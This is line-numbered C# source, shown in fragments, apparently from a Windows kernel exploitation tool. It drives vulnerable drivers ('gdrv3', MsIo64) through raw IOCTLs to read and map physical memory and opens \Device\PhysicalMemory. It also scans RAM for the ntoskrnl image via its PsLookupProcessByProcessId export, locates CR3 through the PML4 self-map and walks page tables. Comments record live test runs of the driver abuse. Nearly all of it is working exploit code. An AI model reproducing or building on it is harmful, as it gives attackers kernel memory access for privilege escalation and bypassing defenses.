  82|     {
  83|         IntPtr tok; long luid;

  85|             return "OpenProcessToken err=" + Marshal.GetLastWin32Error();

  87|             return "LookupPrivilegeValue err=" + Marshal.GetLastWin32Error();

  89|         tp.Count = 1; tp.Luid = luid; tp.Attr = SE_PRIVILEGE_ENABLED;
  90|         bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
  91|         int err = Marshal.GetLastWin32Error();

  93|         if (!ok) return "AdjustTokenPrivileges err=" + err;
  94|         if (err == 1300) return "NOT_ASSIGNED (absent from token)";
  95|         return "ok";
  96|     }

  98|     static IntPtr Stage(int size)
  99|     {
 100|         if (g_Stage != IntPtr.Zero && g_StageLen < size)
 101|         {
 102|             VirtualUnlock(g_Stage, new IntPtr(g_StageLen));
 103|             VirtualFree(g_Stage, IntPtr.Zero, MEM_RELEASE);
 104|             g_Stage = IntPtr.Zero;
 105|         }
 106|         if (g_Stage == IntPtr.Zero)
 107|         {
 108|             g_Stage = VirtualAlloc(IntPtr.Zero, new IntPtr(size), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 109|             if (g_Stage == IntPtr.Zero) throw new Exception("VirtualAlloc err=" + Marshal.GetLastWin32Error());
 110|             if (!VirtualLock(g_Stage, new IntPtr(size))) throw new Exception("VirtualLock err=" + Marshal.GetLastWin32Error());
 111|             g_StageLen = size;
 112|         }
 113|         return g_Stage;
 114|     }

 130|     public static void SetRamRanges(string csv, ulong ramTopFallback)
 131|     {
 132|         RamTopFallback = ramTopFallback;
 133|         if (string.IsNullOrEmpty(csv)) return;
 134|         string[] p = csv.Split(',');
 135|         ulong[] s = new ulong[p.Length];
 136|         ulong[] e = new ulong[p.Length];
 137|         int n = 0;
 138|         for (int i = 0; i < p.Length; i++)
 139|         {
 140|             int d = p[i].IndexOf('-');
 141|             if (d <= 0) continue;
 142|             s[n] = Convert.ToUInt64(p[i].Substring(0, d), 16);
 143|             e[n] = Convert.ToUInt64(p[i].Substring(d + 1), 16);
 144|             if (e[n] > s[n]) n++;
 145|         }
 146|         RamStarts = new ulong[n]; RamEnds = new ulong[n];
 147|         Array.Copy(s, RamStarts, n); Array.Copy(e, RamEnds, n);
 148|     }

 150|     // ---- the RAM truth table, from a source that actually works ----------------
 151|     // .NET's RegistryKey cannot read REG_RESOURCE_LIST: GetValue(".Translated") returns
 152|     // NULL and GetValueKind says "Unknown" (verified on this box 01/11).  That is why
 153|     // the caller's PowerShell parse came out EMPTY and the hole filter silently
 154|     // degenerated to "pa < ramTop" - i.e. straight into the PCI/MMIO hole.  Read the raw
 155|     // value with RegQueryValueEx and take the CmResourceTypeMemory (3) descriptors out
 156|     // of the CM_RESOURCE_LIST.
 157|     const int HKEY_LOCAL_MACHINE = unchecked((int)0x80000002);
 158|     const int KEY_READ = 0x20019;

 160|     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
 161|     static extern int RegOpenKeyEx(IntPtr root, string sub, int opt, int sam, out IntPtr hk);
 162|     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
 163|     static extern int RegQueryValueEx(IntPtr hk, string name, IntPtr res, out int type, byte[] data, ref int cb);
 164|     [DllImport("advapi32.dll")]

 167|     public static string RamRangesFromRegistry()
 168|     {
 169|         IntPtr hk;
 170|         int st = RegOpenKeyEx(new IntPtr(HKEY_LOCAL_MACHINE),
 171|                               @"HARDWARE\RESOURCEMAP\System Resources\Physical Memory",
 172|                               0, KEY_READ, out hk);
 173|         if (st != 0) return "open=0x" + st.ToString("x");
 174|         try
 175|         {
 176|             int type = 0, cb = 0;
 177|             st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, null, ref cb);
 178|             if (st != 0 || cb <= 0) return "query=0x" + st.ToString("x") + " cb=" + cb;
 179|             byte[] rb = new byte[cb];
 180|             st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, rb, ref cb);
 181|             if (st != 0) return "read=0x" + st.ToString("x") + " type=" + type;
 182|             if (cb < 16) return "short cb=" + cb + " type=" + type;
 183| 
 184|             int off = 4;
 185|             uint cnt = BitConverter.ToUInt32(rb, 0);
 186|             StringBuilder sb = new StringBuilder();
 187|             int guard = 0;
 188|             for (uint l = 0; l < cnt && off + 16 <= cb; l++)
 189|             {
 190|                 off += 12;                                     // CM_RESOURCE_LIST header
 191|                 if (off + 4 > cb) break;
 192|                 uint n = BitConverter.ToUInt32(rb, off); off += 4;
 193|                 // FIXED 02/11: the live .Translated dump (_ritual\_ramhex.txt, list rev 5,
 194|                 // 5 descriptors) shows 20-BYTE descriptors: type(1)+share(1)+flags(2)+
 195|                 // start(8)+length(8), and the top region is CmResourceTypeMemoryLarge(7)
 196|                 // with CM_RESOURCE_MEMORY_LARGE_40 flags 0x200 (length stored >> 8).
 197|                 // The old 16-byte/4-byte walk read exactly one range (1000-9e000) and
 198|                 // starved the whole X discovery (p36 run 1, 01:48:30).
 199|                 for (uint d = 0; d < n && off + 20 <= cb && guard++ < 4096; d++)
 200|                 {
 201|                     byte t = rb[off];
 202|                     ushort flags = BitConverter.ToUInt16(rb, off + 2);
 203|                     ulong s0 = BitConverter.ToUInt64(rb, off + 4);
 204|                     ulong ln = BitConverter.ToUInt64(rb, off + 12);
 205|                     off += 20;
 206|                     if (ln == 0) continue;
 207|                     if (t == 7)
 208|                     {
 209|                         if ((flags & 0x0200) != 0) ln <<= 8;        // CM_RESOURCE_MEMORY_LARGE_40
 210|                         else if ((flags & 0x0400) != 0) ln <<= 16; // CM_RESOURCE_MEMORY_LARGE_48
 211|                         else if ((flags & 0x0800) != 0) ln <<= 32; // CM_RESOURCE_MEMORY_LARGE_64
 212|                     }
 213|                     if (t == 3 || t == 7)
 214|                     {
 215|                         if (sb.Length > 0) sb.Append(',');
 216|                         sb.Append(s0.ToString("x")).Append('-').Append((s0 + ln).ToString("x"));
 217|                     }
 218|                 }
 219|             }
 220|             return sb.Length > 0 ? sb.ToString() : "no-memory-descriptors cb=" + cb;
 221|         }
 222|         finally { RegCloseKey(hk); }
 223|     }

 251|     // true when [pa, pa+size) overlaps any blacklisted range
 252|     public static bool IsBad(ulong pa, int size)
 253|     {
 254|         for (int i = 0; i < BadEnds.Length; i++)

 256|         return false;

 259|     public static bool InRam(ulong pa)
 260|     {
 261|         if (IsBad(pa, 1)) return false;
 262|         if (RamEnds.Length == 0)
 263|         {
 264|             if (RamTopFallback == 0) return true;
 265|             return pa < RamTopFallback && !(pa >= 0xA0000 && pa < 0x100000);
 266|         }
 267|         for (int i = 0; i < RamEnds.Length; i++)
 268|             if (pa >= RamStarts[i] && pa < RamEnds[i]) return true;
 269|         return false;
 270|     }

 272|     // the whole [pa, pa+size) must live inside ONE range - a read that straddles a
 273|     // range end walks into a hole and avs the driver.
 274|     public static bool InRamSpan(ulong pa, int size)
 275|     {
 276|         if (IsBad(pa, size)) return false;
 277|         if (RamEnds.Length == 0) return InRam(pa);
 278|         for (int i = 0; i < RamEnds.Length; i++)
 279|             if (pa >= RamStarts[i] && pa + (ulong)size <= RamEnds[i]) return true;
 280|         return false;
 281|     }

 294|     // page per IOCTL, locked non-zeroed dst, out_len 0.  A single >4 KiB read is

 296|     public static int SkippedOutOfRam;   // refused because the PA is not backed by RAM
 297|     public static int Issued;            // IOCTLs actually handed to gdrv3
 298|     public static ulong LastIssuedPa;    // the PA of the last IOCTL (breadcrumb)

 300|     // raw = no RAM validation (use it to measure what gdrv3 itself tolerates)
 301|     public static byte[] GdrvReadOneRaw(IntPtr h, ulong pa, int size)
 302|     {
 303|         IntPtr stage = Stage(Math.Max(size, 0x1000));
 304|         IntPtr inb = Marshal.AllocHGlobal(0x18);
 305|         try
 306|         {
 307|             Marshal.WriteInt64(inb, 0x00, (long)pa);
 308|             Marshal.WriteInt32(inb, 0x08, size);
 309|             Marshal.WriteInt32(inb, 0x0C, 0);
 310|             Marshal.WriteInt64(inb, 0x10, stage.ToInt64());
 311|             LastIssuedPa = pa; Issued++;
 312|             if (Notify != null)
 313|                 Notify(string.Format("  [io] read pa=0x{0:x} size=0x{1:x}{2}", pa, size,
 314|                                      InRamSpan(pa, size) ? "" : "   <<< NOT RAM-BACKED"));
 315|             uint got;
 316|             if (!DeviceIoControl(h, 0xC3502014, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero))
 317|                 throw new Exception("read pa=0x" + pa.ToString("x") + " size=0x" + size.ToString("x")
 318|                                     + " err=" + Marshal.GetLastWin32Error());
 319|             byte[] res = new byte[size];
 320|             Marshal.Copy(stage, res, 0, size);
 321|             return res;
 322|         }
 323|         finally { Marshal.FreeHGlobal(inb); }
 324|     }

 326|     // validated read - the default for every scan/walk step
 327|     public static byte[] GdrvReadOne(IntPtr h, ulong pa, int size)
 328|     {
 329|         if (!InRamSpan(pa, size))
 330|         {
 331|             SkippedOutOfRam++;
 332|             if (Notify != null)
 333|                 Notify(string.Format("  [io] SKIP pa=0x{0:x} size=0x{1:x} (hole/not RAM)", pa, size));
 334|             return new byte[size];
 335|         }
 336|         return GdrvReadOneRaw(h, pa, size);
 337|     }

 339|     public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
 340|     {
 341|         const int CH = 0x1000;
 342|         byte[] outb = new byte[size];
 343|         int off = 0;
 344|         while (off < size)
 345|         {
 346|             int n = Math.Min(CH, size - off);
 347|             byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
 348|             Array.Copy(part, 0, outb, off, n);
 349|             off += n;
 350|         }
 351|         return outb;
 352|     }

 356|     public static string SizeLadder(IntPtr g, ulong pa, out string rep)
 357|     {
 358|         rep = "";
 359|         int[] sizes = new int[] { 0x40, 0x100, 0x800, 0x1000, 0x2000, 0x4000, 0x10000, 0x20000 };
 360|         int okCount = 0;
 361|         for (int i = 0; i < sizes.Length; i++)

 367|                 okCount++;
 368|             }
 369|             catch (Exception e) { rep += string.Format("  size 0x{0:x} FAIL {1}\r\n", sizes[i], e.Message); }
 370|         }

 374|     // Is the read range limited?  dword probe every `step` bytes, errors caught.
 375|     public static string SweepRead(IntPtr g, ulong from, ulong to, ulong step, out string rep)
 376|     {
 377|         rep = "";
 378|         int okCount = 0, failCount = 0;
 379|         ulong firstFail = 0, lastOk = 0, lastFail = 0;
 380|         for (ulong pa = from; pa < to; pa += step)
 381|         {
 382|             try { RdD(g, pa); okCount++; lastOk = pa; }
 383|             catch (Exception)
 384|             {
 385|                 failCount++; if (firstFail == 0) firstFail = pa; lastFail = pa;
 386|                 if (failCount <= 6) rep += string.Format("  fail pa=0x{0:x}\r\n", pa);
 387|             }
 388|         }
 389|         rep += string.Format("  ok={0} fail={1} firstFail=0x{2:x} lastOk=0x{3:x} lastFail=0x{4:x}\r\n",
 390|                              okCount, failCount, firstFail, lastOk, lastFail);
 391|         return okCount.ToString();
 392|     }

 404|     // ---- W1: physical R/W through \Device\PhysicalMemory (native) ----------

 406|     {
 407|         section = IntPtr.Zero;
 408|         string p1 = EnablePriv("SeLockMemoryPrivilege");
 409|         string nm = @"\Device\PhysicalMemory";
 410|         IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
 411|         IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
 412|         try

 414|             UNICODE_STRING us = new UNICODE_STRING();
 415|             us.Length = (ushort)(nm.Length * 2);

 417|             us.Buffer = nameBuf;

 425|             if (st < 0) return string.Format("priv={0} NtOpenSection=0x{1:x8}", p1, st);
 426|             section = s;

 561|     // A loader-mapped ntoskrnl PE, validated by finding a real export name in
 562|     // its export table.  hal.dll/win32k are filtered by SizeOfImage.
 563|     public static string ScanNtoskrnl(IntPtr g, ulong ramTop, ulong limit, out string hits)
 564|     {
 565|         hits = "";
 566|         ulong top = Math.Min(ramTop, limit);
 567|         byte[] chunk;
 568|         for (ulong pa = 0x100000; pa < top; pa += 0x10000)
 569|         {
 570|             if (!InRam(pa, ramTop)) continue;
 571|             chunk = GdrvRead(g, pa, 0x10000);
 572|             for (int o = 0; o < 0x10000; o += 0x1000)
 573|             {
 574|                 if (chunk[o] != 0x4D || chunk[o + 1] != 0x5A) continue;      // MZ
 575|                 uint e_lfanew = BitConverter.ToUInt32(chunk, o + 0x3C);
 576|                 if (e_lfanew < 0x40 || e_lfanew > 0x200) continue;
 577|                 int pe = o + (int)e_lfanew;
 578|                 if (pe + 0x120 > 0x10000) continue;
 579|                 if (BitConverter.ToUInt32(chunk, pe) != 0x00004550) continue; // PE\0\0
 580|                 if (BitConverter.ToUInt16(chunk, pe + 4) != 0x8664) continue; // amd64
 581|                 int opt = pe + 0x18;
 582|                 if (BitConverter.ToUInt16(chunk, opt) != 0x20B) continue;     // PE32+
 583|                 ushort subsys = BitConverter.ToUInt16(chunk, opt + 0x44);
 584|                 uint sizeImage = BitConverter.ToUInt32(chunk, opt + 0x38);
 585|                 if (subsys != 10) continue;                                   // NATIVE
 586|                 if (sizeImage < 0x400000 || sizeImage > 0x4000000) continue;
 587|                 ulong imgPa = (pa + (ulong)o) & ~0xFFFUL;
 588|                 string verify = ExportHas(g, imgPa, opt, 0x70, "PsLookupProcessByProcessId");
 589|                 string line = string.Format("  native PE pa=0x{0:x} sizeOfImage=0x{1:x} preferred=0x{2:x} export[{3}]",
 590|                                             imgPa, sizeImage,
 591|                                             BitConverter.ToUInt64(chunk, opt + 0x18), verify);
 592|                 hits += line + "\r\n";
 593|                 if (verify == "yes") return imgPa.ToString("x");
 594|             }
 595|         }
 596|         return "";
 597|     }

 599|     // Export directory entry 0 (or 1 for a second dir) walk; returns "yes"/"no".
 600|     static string ExportHas(IntPtr g, ulong imgPa, int opt, int dirOff, string want)
 601|     {
 602|         try
 603|         {
 604|             byte[] d = GdrvRead(g, imgPa + (ulong)(opt + dirOff), 8);
 605|             uint rva = BitConverter.ToUInt32(d, 0), sz = BitConverter.ToUInt32(d, 4);
 606|             if (rva == 0 || sz < 0x28) return "no-dir";
 607|             byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
 608|             uint count = BitConverter.ToUInt32(ed, 0x18);       // NumberOfNames
 609|             uint names = BitConverter.ToUInt32(ed, 0x20);       // AddressOfNames RVA
 610|             if (count == 0 || count > 0x2000) return "no-names";
 611|             byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
 612|             for (uint i = 0; i < count; i++)
 613|             {
 614|                 uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
 615|                 byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
 616|                 bool same = true;
 617|                 for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
 618|                 if (same) return "yes";

 622|         catch (Exception) { return "err"; }

 624|     // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
 625|     // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
 626|     // point at the PML4 itself.  A candidate is only accepted when the double
 627|     // self-reference holds AND the kernel half of the table is populated.
 628|     public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
 629|     {
 630|         cr3 = 0; notes = "";
 631|         ulong top = Math.Min(ramTop, limit);
 632|         int seen = 0;
 633|         for (ulong pa = 0x1000; pa + 0x1000 <= top; pa += 0x1000)
 634|         {
 635|             if (!InRam(pa, ramTop)) continue;
 636|             ulong e = RdQ(g, pa + 0x1EDUL * 8);
 637|             if ((e & 1) == 0) continue;
 638|             if ((e & 0x000FFFFFFFFFF000UL) != pa) continue;
 639|             ulong pdpt = e & 0x000FFFFFFFFFF000UL;
 640|             ulong e2 = RdQ(g, pdpt + 0x1EDUL * 8);
 641|             if ((e2 & 1) == 0) continue;
 642|             if ((e2 & 0x000FFFFFFFFFF000UL) != pa) continue;
 643|             int present = 0;
 644|             for (int i = 0x100; i < 0x200; i++) if ((RdQ(g, pa + (ulong)i * 8) & 1) != 0) present++;
 645|             seen++;
 646|             if (seen <= 8) notes += string.Format("  self-map candidate cr3=0x{0:x} kernel_entries_present={1}\r\n", pa, present);
 647|             if (present < 8) continue;
 648|             if (cr3 == 0) cr3 = pa;
 649|         }
 650|         return cr3 == 0 ? "" : seen.ToString();
 651|     }

 653|     public static bool Walk(IntPtr g, ulong cr3, ulong va, out ulong pa)
 654|     {
 655|         pa = 0;
 656|         ulong e = RdQ(g, cr3 + ((va >> 39) & 0x1FF) * 8);
 657|         if ((e & 1) == 0) return false;
 658|         ulong t = e & 0x000FFFFFFFFFF000UL;
 659|         e = RdQ(g, t + ((va >> 30) & 0x1FF) * 8);
 660|         if ((e & 1) == 0) return false;
 661|         if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFC0000000UL) + (va & 0x3FFFFFFFUL); return true; }
 662|         t = e & 0x000FFFFFFFFFF000UL;
 663|         e = RdQ(g, t + ((va >> 21) & 0x1FF) * 8);
 664|         if ((e & 1) == 0) return false;
 665|         if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFFFE00000UL) + (va & 0x1FFFFFUL); return true; }
 666|         t = e & 0x000FFFFFFFFFF000UL;
 667|         e = RdQ(g, t + ((va >> 12) & 0x1FF) * 8);
 668|         if ((e & 1) == 0) return false;
 669|         pa = (e & 0x000FFFFFFFFFF000UL) + (va & 0xFFFUL);
 670|         return true;
 671|     }

 782|     // (temp\drv\annot_MsIo64.txt):  in = { q0 = view length (driver caps it at 4!),
 783|     // q1 = user VA whose LOW 32 BITS are the PHYSICAL ADDRESS to map, q2/q3/q4 = 0
 784|     // in -> out: section handle / view base VA in OUR process / section object }.
 785|     // The driver ZwOpenSection's \Device\PhysicalMemory with kernel PreviousMode
 786|     // (the usermode DACL that kills W1 does not apply), then ZwMapViewOfSection(
 787|     // handle, -1 /*current process*/, ..., SectionOffset=low32(q1),
 788|     // ViewSize=min(q0,4), PAGE_READWRITE|NOCACHE).  Worker 0x10aa..0x10d0 also
 789|     // range-checks low32(q1) in [G, G+0x10000000) of a driver global (image offset
 790|     // 0x3150) -- outside it the call dies with STATUS_ACCESS_DENIED (win32 err 5),
 791|     // which is exactly what p36 run 1's try2 saw.  G is not known statically, so
 792|     // the caller sweeps PAs and the OK-vs-err5 pattern reveals the window.
 793|     // q1 must ALSO be a valid user VA (map handler ProbeForRead/Write(q1, q0, 4)),
 794|     // so we VirtualAlloc a region at the 64 KiB-aligned base covering pa and pass
 795|     // pa itself as q1: low32(q1) == pa, and the VA is readable/writable.
 796|     public static string MsIoMapTry3(IntPtr h, ulong pa, uint size, out uint err,
 797|                                      out ulong viewBase, out ulong oq2, out ulong oq4)
 798|     {

 801|         ulong region = pa & ~0xFFFFul;
 802|         IntPtr va = VirtualAlloc(new IntPtr((long)region), new IntPtr(0x20000),
 803|                                 0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
 804|         if (va == IntPtr.Zero)
 805|             return "alloc@0x" + region.ToString("x") + " FAIL err=" + Marshal.GetLastWin32Error();
 806|         try
 807|         {
 808|             IntPtr inb = Marshal.AllocHGlobal(0x28);
 809|             try
 810|             {
 811|                 for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
 812|                 Marshal.WriteInt64(inb, 0x00, (long)size);
 813|                 Marshal.WriteInt64(inb, 0x08, (long)pa);
 814|                 uint got;
 815|                 bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
